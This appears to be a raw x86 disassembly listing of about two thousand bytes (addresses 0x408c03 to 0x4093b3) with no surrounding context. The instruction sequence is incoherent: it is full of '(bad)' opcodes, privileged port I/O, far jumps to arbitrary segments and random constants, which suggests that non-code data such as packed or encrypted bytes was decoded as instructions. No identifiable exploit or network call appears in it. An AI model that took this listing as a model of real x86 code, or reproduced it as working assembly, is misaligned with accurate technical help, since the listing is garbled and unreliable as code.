  408c03:	int    0x9e
  408c05:	std    
  408c06:	mov    DWORD PTR [eax-0x50652665],edi
  408c0c:	sbb    BYTE PTR [eax],bl
  408c0e:	mov    esi,0xd1cdded7
  408c13:	mov    al,0x9e
  408c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c16:	dec    edi
  408c17:	sub    al,0x94
  408c19:	pop    edi
  408c1a:	jl     0x408c1d
  408c1c:	sbb    eax,0xb60b771
  408c21:	sbb    edi,edi
  408c23:	sbb    eax,0x5454c1df
  408c28:	pop    eax
  408c29:	push   0xffffffcb
  408c2b:	pop    ecx
  408c2c:	jb     0x408c87
  408c2e:	dec    ebx
  408c2f:	or     eax,0xe847cef5
  408c34:	inc    esi
  408c35:	lea    ebp,[esi+0x8]
  408c38:	out    0xd7,al
  408c3a:	mov    dl,0xc
  408c3c:	mov    esp,0x2e93b146
  408c41:	fcmovu st,st(5)
  408c43:	xchg   ebx,eax
  408c44:	mov    ds:0x6612d69a,al
  408c49:	jl     0x408c1c
  408c4b:	les    edi,FWORD PTR ds:0x87329838
  408c51:	lock arpl WORD PTR [edi],di
  408c54:	cmp    dl,BYTE PTR es:[eax-0x50]
  408c58:	sub    al,BYTE PTR [eax+ebx*2-0x618cfc58]
  408c5f:	and    al,0x41
  408c61:	pop    esi
  408c62:	add    al,0x9a
  408c64:	in     eax,0x6a
  408c66:	push   ebx
  408c67:	hlt    
  408c68:	sti    
  408c69:	mov    ah,0xe6
  408c6b:	call   0x11b328a
  408c70:	retf   
  408c71:	mov    al,ds:0x49f845d9
  408c76:	mov    ah,ah
  408c78:	bnd jae 0x408c24
  408c7b:	in     al,dx
  408c7c:	cmp    esi,DWORD PTR [ebp-0x2e57f81c]
  408c82:	cmc    
  408c83:	lsl    ebx,ax
  408c86:	adc    al,0x35
  408c88:	sahf   
  408c89:	push   eax
  408c8a:	out    0x61,al
  408c8c:	sahf   
  408c8d:	sub    ch,cl
  408c8f:	pop    ds
  408c90:	or     cl,cl
  408c92:	test   al,0x5f
  408c94:	ins    DWORD PTR es:[edi],dx
  408c95:	dec    edx
  408c96:	sti    
  408c97:	push   esp
  408c98:	cs mov bl,0xdd
  408c9b:	outs   dx,BYTE PTR ds:[esi]
  408c9c:	in     eax,0xe5
  408c9e:	xchg   edi,eax
  408c9f:	push   es
  408ca0:	bound  edx,QWORD PTR [eax-0x308c7820]
  408ca6:	cmp    al,0x93
  408ca8:	ficomp DWORD PTR [eax+0x3babbb95]
  408cae:	lea    ebx,[ecx]
  408cb0:	into   
  408cb1:	(bad)  
  408cb2:	(bad)  [esi+0x4]
  408cb5:	sub    eax,0x95820ee1
  408cba:	out    0x59,al
  408cbc:	in     al,0x48
  408cbe:	(bad)  
  408cbf:	jge    0x408d0c
  408cc1:	sbb    eax,0xac82d478
  408cc6:	shl    DWORD PTR [eax+0x3aa63060],cl
  408ccc:	paddb  mm1,mm7
  408ccf:	pop    es
  408cd0:	or     al,0xc9
  408cd2:	out    0x9,eax
  408cd4:	pusha  
  408cd5:	sahf   
  408cd6:	pop    edx
  408cd7:	out    0xe7,al
  408cd9:	mov    ch,0x40
  408cdb:	cmp    BYTE PTR [edi],0xc6
  408cde:	into   
  408cdf:	addr16 pop edx
  408ce1:	shl    BYTE PTR [edx],cl
  408ce3:	add    cl,bh
  408ce5:	inc    ebp
  408ce6:	mov    ds:0x703574e5,al
  408ceb:	fnsave [esi-0x65f75d39]
  408cf1:	xor    ah,BYTE PTR [ebx+edi*4-0x5d]
  408cf5:	jl     0x408d75
  408cf7:	loopne 0x408c98
  408cf9:	cdq    
  408cfa:	(bad)  [esi-0x7120c178]
  408d00:	arpl   WORD PTR [edx],di
  408d02:	dec    ebx
  408d03:	outs   dx,BYTE PTR ds:[esi]
  408d04:	popf   
  408d05:	imul   esi,ebp,0x43ed9ab7
  408d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d0c:	cli    
  408d0d:	sbb    DWORD PTR [edi+0x1f],edi
  408d10:	adc    al,0x72
  408d12:	mov    al,ds:0x7967b7c3
  408d17:	mov    al,0x88
  408d19:	add    DWORD PTR [edx+0x6bd29a5b],0x2b
  408d20:	add    BYTE PTR [eax-0x33],ch
  408d23:	mov    ds:0x439b9cb1,al
  408d28:	pop    ds
  408d29:	add    eax,0x7c46d4ae
  408d2f:	call   0x35e7604
  408d34:	xchg   edi,eax
  408d35:	scas   eax,DWORD PTR es:[edi]
  408d36:	or     al,0xd0
  408d38:	jg     0x408d6a
  408d3a:	retf   0x477b
  408d3d:	mov    esi,0xc2b36fc8
  408d42:	dec    esi
  408d43:	in     al,0xf9
  408d45:	out    dx,eax
  408d46:	inc    esp
  408d47:	mov    eax,DWORD PTR [ecx-0x4bf84a86]
  408d4d:	add    al,0x60
  408d4f:	mov    edx,0x6720b856
  408d54:	pushf  
  408d55:	leave  
  408d56:	vhsubpd xmm3,xmm5,XMMWORD PTR [ebx+0x2e]
  408d5b:	cmc    
  408d5c:	retf   
  408d5d:	out    dx,al
  408d5e:	sbb    DWORD PTR [ebx],ebx
  408d60:	and    ecx,ecx
  408d62:	ins    DWORD PTR es:[edi],dx
  408d63:	in     eax,dx
  408d64:	call   0xf874e230
  408d69:	push   ebx
  408d6a:	out    0xc9,eax
  408d6c:	(bad)  [edi]
  408d6e:	adc    al,0xd7
  408d70:	adc    al,0x2a
  408d72:	mov    ds,WORD PTR [esi+0x2c]
  408d75:	scas   al,BYTE PTR es:[edi]
  408d76:	sti    
  408d77:	fild   QWORD PTR [esi]
  408d79:	push   esi
  408d7a:	push   edi
  408d7b:	jecxz  0x408d54
  408d7d:	push   esi
  408d7e:	(bad)  
  408d7f:	xlat   BYTE PTR ds:[ebx]
  408d80:	jle    0x408d46
  408d82:	vpshab ymm12,[eax],xmm4
  408d87:	pushf  
  408d88:	lods   eax,DWORD PTR ds:[esi]
  408d89:	xor    esi,DWORD PTR [ecx]
  408d8b:	jnp    0x408d79
  408d8d:	loope  0x408d3d
  408d8f:	pop    edx
  408d90:	in     eax,dx
  408d91:	loope  0x408d15
  408d93:	ret    0xeb39
  408d96:	jae    0x408daf
  408d98:	push   edx
  408d99:	int3   
  408d9a:	mov    dl,0xd1
  408d9c:	add    ecx,DWORD PTR [eax-0x67]
  408d9f:	sub    eax,0x7aae3163
  408da4:	test   DWORD PTR [ecx-0x39],0x75e4d812
  408dab:	adc    BYTE PTR [ebp+0x22],al
  408dae:	stc    
  408daf:	cmp    eax,0xfde277b5
  408db4:	cli    
  408db5:	jmp    0xb67dc701
  408dba:	adc    bl,BYTE PTR [ecx+0x29cb2432]
  408dc0:	enter  0xf8e5,0x8f
  408dc4:	stos   BYTE PTR es:[edi],al
  408dc5:	mov    ds:0x11253d84,eax
  408dcb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  408dcd:	mov    dl,0x96
  408dcf:	retf   0x68da
  408dd2:	ret    0x35df
  408dd5:	js     0x408e03
  408dd7:	pop    esi
  408dd8:	mov    ds:0xd302f0d9,al
  408ddd:	mov    bl,0x51
  408ddf:	cvtps2pd xmm3,QWORD PTR [eax-0x6]
  408de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de4:	stos   DWORD PTR es:[edi],eax
  408de5:	ja     0x408dc8
  408de7:	xchg   ebp,eax
  408de8:	sbb    BYTE PTR [ebx+eax*1],0x5
  408dec:	(bad)  
  408ded:	aam    0xef
  408def:	push   eax
  408df0:	xchg   edx,eax
  408df1:	dec    ebx
  408df2:	cmp    eax,0xbe0601f9
  408df7:	lahf   
  408df8:	push   ecx
  408df9:	xor    BYTE PTR [ecx+eiz*1],ah
  408dfc:	jge    0x408dcc
  408dfe:	xchg   edx,eax
  408dff:	cli    
  408e00:	dec    ebp
  408e01:	cdq    
  408e02:	add    al,0x23
  408e04:	or     eax,0x25370f89
  408e09:	sub    al,BYTE PTR [edi+edi*1-0x345f613c]
  408e10:	push   edx
  408e11:	pop    es
  408e12:	(bad)  
  408e13:	sbb    esp,DWORD PTR [ecx]
  408e15:	mov    eax,0x38c14863
  408e1a:	popf   
  408e1b:	ret    0xe750
  408e1e:	jnp    0x408dfc
  408e20:	add    ah,ah
  408e22:	xchg   esi,eax
  408e23:	mov    cl,0x3f
  408e25:	ins    DWORD PTR es:[edi],dx
  408e26:	call   0x2c08:0x514dcb9e
  408e2d:	dec    ebx
  408e2e:	jge    0x408e8c
  408e30:	or     ebp,ecx
  408e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e33:	mov    edx,DWORD PTR [esi+0x26b26aa1]
  408e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e3a:	(bad)  
  408e3b:	mov    edx,edi
  408e3d:	iret   
  408e3e:	scas   eax,DWORD PTR es:[edi]
  408e3f:	adc    al,0x4c
  408e41:	cmp    esp,eax
  408e43:	adc    ah,bh
  408e45:	mov    ch,0x8f
  408e47:	popa   
  408e48:	dec    esp
  408e49:	add    al,0x32
  408e4b:	inc    ebx
  408e4c:	mov    eax,ds
  408e4e:	test   eax,0xe8ac7adb
  408e53:	xchg   esp,eax
  408e54:	inc    BYTE PTR [ecx]
  408e56:	inc    ecx
  408e57:	push   ds
  408e58:	mov    ebx,0x4f98a473
  408e5d:	push   ebp
  408e5e:	cwde   
  408e5f:	mov    ebx,0x8a7a9a47
  408e64:	adc    ebp,DWORD PTR [ebx-0xba7917c]
  408e6a:	add    al,0x25
  408e6c:	(bad)  
  408e6d:	clc    
  408e6e:	dec    esi
  408e6f:	inc    edx
  408e70:	xor    DWORD PTR [ebx-0xdaa61be],0x67b8e0d2
  408e7a:	jge    0x408e4a
  408e7c:	inc    esi
  408e7d:	push   0xffffffb2
  408e7f:	or     al,0xc2
  408e81:	add    eax,0xd093d2f
  408e86:	add    ebx,esi
  408e88:	mov    ch,0xbd
  408e8a:	out    dx,al
  408e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e8c:	cmp    dh,BYTE PTR [ecx-0x5fc2e467]
  408e92:	and    DWORD PTR cs:[eax],ecx
  408e95:	mov    ebx,DWORD PTR [edi+0x2c]
  408e98:	dec    ebp
  408e99:	mov    edx,0xaa8f71dc
  408e9e:	stc    
  408e9f:	cmp    eax,0x636ac46c
  408ea4:	nop
  408ea5:	mov    ah,0xc6
  408ea7:	imul   edx,edx,0x36
  408eaa:	adc    eax,ecx
  408eac:	rcl    bl,cl
  408eae:	cdq    
  408eaf:	mov    bh,0x61
  408eb1:	inc    ebp
  408eb2:	repnz adc DWORD PTR [edx-0x27df93a0],edi
  408eb9:	xchg   esp,eax
  408eba:	int3   
  408ebb:	sbb    al,0x5e
  408ebd:	hlt    
  408ebe:	mov    al,ds:0xf64f6e66
  408ec3:	fnstenv [ecx+0x30d1cba3]
  408ec9:	or     DWORD PTR [edx],esp
  408ecb:	rcr    DWORD PTR [ecx],1
  408ecd:	dec    esi
  408ece:	cmp    eax,0xb71ee2f
  408ed3:	xor    DWORD PTR [ebx+ebx*2],esp
  408ed6:	outs   dx,DWORD PTR ds:[esi]
  408ed7:	or     eax,0x77f031c7
  408edc:	pop    edx
  408edd:	ss jmp 0x408efb
  408ee0:	push   edx
  408ee1:	adc    ah,cl
  408ee3:	ja     0x408f13
  408ee5:	mov    edx,0xce84f938
  408eea:	xor    eax,edx
  408eec:	lds    esp,FWORD PTR [ecx]
  408eee:	sahf   
  408eef:	jns    0x408ec1
  408ef1:	sbb    DWORD PTR [ebp+0x6b1fc856],0x54
  408ef8:	in     al,0x8b
  408efa:	aam    0xbe
  408efc:	pop    edi
  408efd:	dec    eax
  408efe:	xchg   ebp,ebx
  408f00:	je     0x408f36
  408f02:	jbe    0x408f22
  408f04:	dec    edx
  408f05:	mov    ebp,0xc5fd606f
  408f0a:	fstp   QWORD PTR [ebp+0x4d07c857]
  408f10:	xchg   ecx,eax
  408f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f12:	loopne 0x408eed
  408f14:	inc    edx
  408f15:	std    
  408f16:	xchg   edx,eax
  408f17:	data16 fstp st(0)
  408f1a:	pusha  
  408f1b:	cmc    
  408f1c:	push   esp
  408f1d:	push   0xffffffb2
  408f1f:	mov    ebp,0x83011b7
  408f24:	out    0x2b,eax
  408f26:	mov    esi,0x5340be6
  408f2b:	xchg   ecx,ebp
  408f2d:	sub    DWORD PTR [ebx+0x5c],esi
  408f30:	jno    0x408f6e
  408f32:	outs   dx,DWORD PTR ds:[esi]
  408f33:	push   ecx
  408f34:	ret    0x8d74
  408f37:	push   ds
  408f38:	xchg   ebx,eax
  408f39:	push   0xce15deec
  408f3e:	inc    edx
  408f3f:	dec    ecx
  408f40:	(bad)  
  408f41:	scas   al,BYTE PTR es:[edi]
  408f42:	js     0x408f18
  408f44:	popa   
  408f45:	add    ebp,eax
  408f47:	push   0xa5e0e03f
  408f4c:	scas   al,BYTE PTR es:[edi]
  408f4d:	xchg   ebp,eax
  408f4e:	sbb    dh,dh
  408f50:	sti    
  408f51:	xor    esi,DWORD PTR [ebp+0x6636d074]
  408f57:	addr16 xchg edi,eax
  408f59:	jg     0x408fcb
  408f5b:	jge    0x408f83
  408f5d:	sahf   
  408f5e:	jp     0x408eea
  408f60:	cmp    eax,DWORD PTR [eax+eiz*8+0x2c]
  408f64:	add    DWORD PTR [ebp-0x3c],edi
  408f67:	mov    ss,WORD PTR [esi+0x2a328b6b]
  408f6d:	sub    cl,BYTE PTR [ebp+0x32]
  408f70:	rcr    BYTE PTR ds:0xe555622c,1
  408f76:	dec    ebp
  408f77:	cmc    
  408f78:	add    eax,0x7bc46a1d
  408f7d:	mov    esi,esi
  408f7f:	cmc    
  408f80:	jmp    0x3ea8:0xcdbe3af0
  408f87:	call   0x36fd:0xc696a7ac
  408f8e:	stos   DWORD PTR es:[edi],eax
  408f8f:	push   eax
  408f90:	pusha  
  408f91:	mov    edi,0xc2553520
  408f96:	dec    esp
  408f97:	cwde   
  408f98:	pop    ebp
  408f99:	pop    ecx
  408f9a:	repz add eax,0x1a7409d8
  408fa0:	and    cl,ch
  408fa2:	push   edi
  408fa3:	pusha  
  408fa4:	cmp    DWORD PTR [ebx+0x33],0x38e079ef
  408fab:	cld    
  408fac:	aaa    
  408fad:	pop    eax
  408fae:	es pusha 
  408fb0:	aad    0x4
  408fb2:	inc    esp
  408fb3:	std    
  408fb4:	dec    eax
  408fb5:	mov    ds,WORD PTR [ecx+0x7ac3ce1d]
  408fbb:	cmp    al,dl
  408fbd:	or     bh,al
  408fbf:	in     eax,dx
  408fc0:	push   ebp
  408fc1:	sub    al,0x96
  408fc3:	(bad)  
  408fc4:	in     eax,dx
  408fc5:	rcl    edi,cl
  408fc7:	dec    ebx
  408fc8:	cli    
  408fc9:	inc    edx
  408fca:	jge    0x409019
  408fcc:	js     0x408f5b
  408fce:	jbe    0x409039
  408fd0:	dec    ebp
  408fd1:	(bad)  
  408fd2:	adc    esp,eax
  408fd4:	and    eax,0xafb0d18a
  408fd9:	stos   DWORD PTR es:[edi],eax
  408fda:	test   eax,0xffd90f39
  408fdf:	aas    
  408fe0:	into   
  408fe1:	adc    al,0xc1
  408fe3:	pop    edi
  408fe4:	adc    al,0xd9
  408fe6:	add    bh,ch
  408fe8:	pop    edx
  408fe9:	inc    edi
  408fea:	jbe    0x408f91
  408fec:	cmp    al,0xb7
  408fee:	adc    eax,0x4c2a6b8e
  408ff3:	adc    bh,BYTE PTR [esi+0x45]
  408ff6:	aas    
  408ff7:	xor    cl,ch
  408ff9:	lods   eax,DWORD PTR ds:[esi]
  408ffa:	std    
  408ffb:	or     ah,BYTE PTR [ebx+0x56c48f54]
  409001:	es mov al,0x38
  409004:	xor    edi,esi
  409006:	test   BYTE PTR [edx-0x63b4e5d9],bh
  40900c:	call   0x7a780a5c
  409011:	jle    0x409053
  409013:	or     ch,dl
  409015:	mov    esp,0x482d4e41
  40901a:	arpl   WORD PTR [edi],sp
  40901c:	loope  0x408fbb
  40901e:	jmp    0xad765b08
  409023:	ss jecxz 0x409036
  409026:	pop    ebx
  409027:	or     eax,DWORD PTR [edx-0x6b]
  40902a:	ins    DWORD PTR es:[edi],dx
  40902b:	mov    ebp,0x32a03b55
  409030:	mov    edx,0x2591d8fb
  409035:	xchg   ebp,eax
  409036:	add    eax,0x8dc95e41
  40903b:	lahf   
  40903c:	and    al,BYTE PTR [ecx-0xb]
  40903f:	into   
  409040:	sar    DWORD PTR [eax+0x53902b0d],cl
  409046:	xchg   ecx,eax
  409047:	jns    0x409010
  409049:	data16 arpl si,dx
  40904c:	cmp    bl,bh
  40904e:	in     al,dx
  40904f:	and    eax,0xabdba298
  409054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409055:	(bad)  
  409057:	inc    ecx
  409058:	dec    esp
  409059:	dec    edx
  40905a:	imul   ebx,DWORD PTR [esi+0x6d],0x978b06d2
  409061:	xchg   ecx,eax
  409062:	sub    al,0x75
  409064:	int    0x75
  409066:	pop    ebp
  409067:	repnz xor BYTE PTR [edx-0x47b0b94e],0x47
  40906f:	mov    cl,0xfc
  409071:	adc    ah,ah
  409073:	sub    DWORD PTR ds:0x90371a7c,ebp
  409079:	xchg   edx,eax
  40907a:	(bad)  
  40907b:	or     ah,BYTE PTR [esi-0x7219df26]
  409081:	test   al,0x90
  409083:	push   es
  409084:	sbb    ch,BYTE PTR [edi]
  409086:	int    0x21
  409088:	adc    eax,0x863639e3
  40908d:	xor    DWORD PTR [edi],ebx
  40908f:	sbb    al,cl
  409091:	stos   BYTE PTR es:[edi],al
  409092:	mov    dl,0xff
  409094:	ret    
  409095:	add    eax,ecx
  409097:	sub    DWORD PTR ds:0xf1135bc7,ebx
  40909d:	fsub   DWORD PTR [ebp-0x6244630d]
  4090a3:	add    al,0x99
  4090a5:	mov    al,0x5f
  4090a7:	push   edx
  4090a8:	pop    es
  4090a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090aa:	fstp   QWORD PTR [edx]
  4090ac:	sbb    al,0xfc
  4090ae:	or     ch,BYTE PTR [ebx+eax*2-0xa617f66]
  4090b5:	push   ebx
  4090b6:	scas   al,BYTE PTR es:[edi]
  4090b7:	mov    esp,DWORD PTR [esi-0x10ea7d1b]
  4090bd:	(bad)  
  4090be:	aad    0xae
  4090c0:	sbb    bl,BYTE PTR [edx-0x320d2169]
  4090c6:	ja     0x40904d
  4090c8:	test   ebx,0xf9ec49aa
  4090ce:	and    al,0xb6
  4090d0:	jnp    0x409087
  4090d2:	sbb    DWORD PTR [edx-0x35349eba],esi
  4090d8:	fsubr  DWORD PTR [eax]
  4090da:	retf   0x402e
  4090dd:	jne    0x40915e
  4090df:	dec    ebp
  4090e0:	sahf   
  4090e1:	addr16 es jb 0x409145
  4090e5:	cmp    BYTE PTR [ebx+0x27b47464],dh
  4090eb:	mov    esi,es
  4090ed:	je     0x409134
  4090ef:	in     al,0xe5
  4090f1:	stc    
  4090f2:	xor    eax,0xd7e5d90d
  4090f7:	and    DWORD PTR [edx+0x22],0x66
  4090fb:	jle    0x4090a8
  4090fd:	inc    esi
  4090fe:	push   0x25
  409100:	push   ecx
  409101:	mov    cl,0x90
  409103:	shl    DWORD PTR [esp+eiz*2-0x4613699b],cl
  40910a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910b:	sbb    bl,dl
  40910d:	popf   
  40910e:	std    
  40910f:	jb     0x4090fb
  409111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409113:	div    BYTE PTR [ecx]
  409115:	jp     0x409125
  409117:	sub    al,0x7b
  409119:	not    DWORD PTR [eax+0x699172c0]
  40911f:	push   ecx
  409120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409121:	fldenv [ebp+0x5d]
  409124:	sub    DWORD PTR [edx-0x5f6623cf],esp
  40912a:	mov    ebp,0xed682da3
  40912f:	sbb    al,0xb6
  409131:	scas   eax,DWORD PTR es:[edi]
  409132:	stc    
  409133:	popf   
  409134:	sub    BYTE PTR [ebx],cl
  409136:	inc    ecx
  409137:	push   edx
  409138:	adc    ch,BYTE PTR [esi+0xb]
  40913b:	pop    esp
  40913c:	inc    ebp
  40913d:	hlt    
  40913e:	out    0xe9,al
  409140:	jle    0x409194
  409142:	jge    0x40912e
  409144:	sbb    dh,BYTE PTR [edi-0x76ea0679]
  40914a:	dec    ebp
  40914b:	mov    eax,ecx
  40914d:	std    
  40914e:	cmp    ebx,DWORD PTR [edx]
  409150:	mov    BYTE PTR [ebx-0x2ebfaf32],bl
  409156:	mov    eax,0x4edbd0db
  40915b:	lods   eax,DWORD PTR ds:[esi]
  40915c:	dec    edx
  40915d:	stos   DWORD PTR es:[edi],eax
  40915e:	neg    al
  409160:	les    edx,FWORD PTR [eax]
  409162:	push   ebp
  409163:	xor    eax,DWORD PTR [ebp+0x1746341b]
  409169:	cdq    
  40916a:	addr16 mov dl,al
  40916d:	dec    esi
  40916e:	adc    al,0x84
  409170:	and    eax,0xb34d718d
  409175:	(bad)  
  409176:	imul   ecx,DWORD PTR ds:0xa0e11f5a,0xffffff83
  40917d:	cli    
  40917e:	xchg   ecx,eax
  40917f:	jmp    0xe774:0xe5af0e58
  409186:	and    edi,esi
  409188:	pushf  
  409189:	cld    
  40918a:	out    dx,al
  40918b:	jmp    DWORD PTR [ebx+ebp*4]
  40918e:	shl    BYTE PTR [edi-0x6e],cl
  409191:	add    BYTE PTR [edi+0x37],cl
  409194:	outs   dx,BYTE PTR ds:[esi]
  409195:	rcl    BYTE PTR [ebp+0x7b],0xfe
  409199:	sbb    ebp,DWORD PTR [ecx+eiz*2+0x1]
  40919d:	jmp    0xed90:0xca1f301b
  4091a4:	pop    ds
  4091a5:	push   ebx
  4091a6:	mov    edx,eax
  4091a8:	fwait
  4091a9:	test   esi,eax
  4091ab:	mov    ecx,0xbfc35291
  4091b0:	scas   eax,DWORD PTR es:[edi]
  4091b1:	and    esi,DWORD PTR [esi]
  4091b3:	mov    BYTE PTR [edi+0xc8c2390],bh
  4091b9:	lods   al,BYTE PTR ds:[esi]
  4091ba:	repz inc ebx
  4091bc:	and    dl,ah
  4091be:	jg     0x40921e
  4091c0:	stc    
  4091c1:	xchg   edi,eax
  4091c2:	into   
  4091c3:	adc    ecx,edx
  4091c5:	cmp    al,0xc2
  4091c7:	dec    ebp
  4091c8:	push   es
  4091c9:	fidivr DWORD PTR [ecx-0x6be07e1]
  4091cf:	xor    eax,0x5190249c
  4091d4:	jmp    0x33066fee
  4091d9:	dec    edi
  4091da:	in     eax,0x36
  4091dc:	loopne 0x4091b4
  4091de:	push   ds
  4091df:	daa    
  4091e0:	inc    ebx
  4091e1:	shr    ecx,0x3f
  4091e4:	cs cs es sub ch,dh
  4091e9:	stos   DWORD PTR es:[edi],eax
  4091ea:	scas   eax,DWORD PTR es:[edi]
  4091eb:	fcom   DWORD PTR [edx]
  4091ed:	enter  0xb755,0x17
  4091f1:	aam    0xd6
  4091f3:	sar    BYTE PTR [ebx-0x6bdf11e7],0x35
  4091fa:	shl    DWORD PTR [edi+0x71f77815],1
  409200:	mov    ch,0x47
  409202:	lods   eax,DWORD PTR ds:[esi]
  409203:	xor    DWORD PTR fs:[eax],ecx
  409206:	or     al,0x15
  409208:	aas    
  409209:	daa    
  40920a:	jb     0x4091b0
  40920c:	sub    DWORD PTR [ebx+0x5b5802d9],edx
  409212:	in     eax,dx
  409213:	pop    es
  409214:	ds call 0xb203040e
  40921a:	fst    DWORD PTR [ebp-0x66]
  40921d:	call   0xe32c:0x365326a8
  409224:	push   ebp
  409225:	jle    0x4091aa
  409227:	pop    es
  409228:	xchg   esi,eax
  409229:	shr    BYTE PTR [esi],0x3c
  40922c:	ror    BYTE PTR [edi],0x63
  40922f:	add    al,BYTE PTR [ecx+0x39]
  409232:	loopne 0x40925a
  409234:	mov    edi,eax
  409236:	into   
  409237:	cmp    bh,ch
  409239:	outs   dx,BYTE PTR ds:[esi]
  40923a:	cwde   
  40923b:	aad    0x68
  40923d:	retf   0x94a
  409240:	inc    esp
  409241:	push   0xa942b1ad
  409246:	push   ecx
  409247:	mov    eax,ds:0x56cd9785
  40924c:	int3   
  40924d:	scas   al,BYTE PTR es:[edi]
  40924e:	sbb    DWORD PTR [ebx+0x2e],0xffffffe7
  409252:	ins    DWORD PTR es:[edi],dx
  409253:	or     eax,0x79bed2e4
  409258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409259:	xor    BYTE PTR [eax+0x35],bh
  40925c:	leave  
  40925d:	aas    
  40925e:	jno    0x409256
  409260:	pop    edi
  409261:	jge    0x409247
  409263:	and    DWORD PTR [ecx+0x25],ebp
  409266:	inc    ecx
  409267:	(bad)  
  409268:	stos   DWORD PTR es:[edi],eax
  409269:	rcl    DWORD PTR [ecx-0x3c],cl
  40926c:	call   0xf5daa9fb
  409271:	repz sub BYTE PTR [ecx-0x76d2e978],ah
  409278:	(bad)  
  409279:	dec    bl
  40927b:	xchg   esp,eax
  40927c:	sub    eax,0xe2d07893
  409281:	scas   al,BYTE PTR es:[edi]
  409282:	jo     0x40926d
  409284:	xchg   ecx,eax
  409285:	imul   eax
  409287:	retf   0xf7e1
  40928a:	mov    ds:0x9ad7b896,eax
  40928f:	pop    edi
  409290:	ja     0x40927b
  409292:	lods   eax,DWORD PTR ds:[esi]
  409293:	sbb    eax,esp
  409295:	idiv   edi
  409297:	inc    edi
  409298:	mov    ebp,edx
  40929a:	inc    esi
  40929b:	jb     0x4092c9
  40929d:	neg    DWORD PTR [esi]
  40929f:	lea    edi,[edi]
  4092a1:	aam    0x64
  4092a3:	outs   dx,BYTE PTR ds:[esi]
  4092a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092a5:	inc    ecx
  4092a6:	out    dx,eax
  4092a7:	(bad)  
  4092a8:	jmp    0x6ef31ecd
  4092ad:	call   0xa5f0:0x93f9b60e
  4092b4:	or     BYTE PTR [eax-0xb4f01e0],ch
  4092ba:	popa   
  4092bb:	dec    ebp
  4092bc:	push   0xf451d6b2
  4092c1:	stos   BYTE PTR es:[edi],al
  4092c2:	fwait
  4092c3:	mov    ch,0xa4
  4092c5:	les    ebp,FWORD PTR [ebx]
  4092c7:	push   ds
  4092c8:	mov    dl,0x59
  4092ca:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4092cc:	inc    ebp
  4092cd:	mov    eax,ds:0xc496e494
  4092d2:	cld    
  4092d3:	(bad)  
  4092d4:	imul   dl
  4092d6:	cld    
  4092d7:	mov    eax,ds:0x5fa45a71
  4092dc:	out    0x1a,eax
  4092de:	je     0x409306
  4092e0:	repz and al,BYTE PTR [ecx]
  4092e3:	js     0x40926f
  4092e5:	xchg   ebp,eax
  4092e6:	cvtdq2ps xmm1,XMMWORD PTR [ecx+eiz*8-0x31e4638b]
  4092ee:	dec    eax
  4092ef:	lock rcl BYTE PTR [edi-0x1a],0x6e
  4092f4:	push   esp
  4092f5:	cmp    al,0xbd
  4092f7:	mov    edx,0xd8643a6e
  4092fc:	gs push ss
  4092fe:	jo     0x40933a
  409300:	xor    al,0x76
  409302:	ret    
  409303:	ret    
  409304:	push   ebp
  409305:	push   ss
  409306:	push   edx
  409307:	jl     0x4092b5
  409309:	push   ecx
  40930a:	xchg   ebp,eax
  40930b:	mov    ah,BYTE PTR [ebx+0x9]
  40930e:	sbb    al,0x2
  409310:	outs   dx,DWORD PTR ds:[esi]
  409311:	out    0x4a,al
  409313:	mov    eax,ds:0x677745f6
  409318:	xchg   ebp,eax
  409319:	mov    esp,0x76a4921f
  40931e:	or     bl,BYTE PTR [edx]
  409320:	ins    BYTE PTR es:[edi],dx
  409321:	data16 xor al,0x79
  409324:	adc    cl,BYTE PTR [ecx]
  409326:	paddb  mm5,QWORD PTR [edx-0x1e]
  40932a:	xchg   ecx,eax
  40932b:	icebp  
  40932c:	outs   dx,BYTE PTR ds:[esi]
  40932d:	mov    ecx,0xf323b27d
  409332:	lods   eax,DWORD PTR ds:[esi]
  409333:	inc    edx
  409334:	dec    ebx
  409335:	jmp    0x32cd:0x79765151
  40933c:	dec    ebx
  40933d:	push   eax
  40933e:	lahf   
  40933f:	loopne 0x409322
  409341:	mov    edx,ecx
  409343:	inc    esi
  409344:	pushf  
  409345:	pop    ecx
  409346:	mov    esp,0x71da3248
  40934b:	mov    bl,0x9c
  40934d:	sbb    DWORD PTR [ebx+ebx*8],esi
  409350:	mov    al,0x89
  409352:	mov    edx,0x123be732
  409357:	xchg   dh,ah
  409359:	mov    eax,edi
  40935b:	cmp    BYTE PTR [ebx+0x7d3e29e],al
  409361:	adc    eax,0xbb94b4ff
  409366:	inc    esi
  409367:	dec    eax
  409368:	jnp    0x4092fe
  40936a:	add    DWORD PTR ds:0x45e81e7a,0xffffffc2
  409371:	inc    ebp
  409372:	out    dx,al
  409373:	lods   al,BYTE PTR ds:[esi]
  409374:	xlat   BYTE PTR ds:[ebx]
  409375:	and    al,0x3c
  409377:	jmp    0xb1eb:0xff9e5675
  40937e:	add    eax,0x64b6420a
  409383:	int    0xd
  409385:	jnp    0x4093e5
  409387:	inc    eax
  409388:	pop    edx
  409389:	mov    ecx,0xe2a9963b
  40938e:	push   edx
  40938f:	(bad)  
  409390:	or     eax,0x76198ac7
  409395:	js     0x409382
  409397:	and    al,0xd5
  409399:	ss mov dl,0x33
  40939c:	(bad)  
  40939d:	fcmove st,st(2)
  40939f:	cmp    cl,BYTE PTR [ecx+0x5ba70040]
  4093a5:	retf   
  4093a6:	cmp    eax,0xd6af2f28
  4093ab:	sub    eax,0x5fe5acb9
  4093b0:	xlat   BYTE PTR ds:[ebx]
  4093b1:	jbe    0x409371
  4093b3:	jbe    0x409402
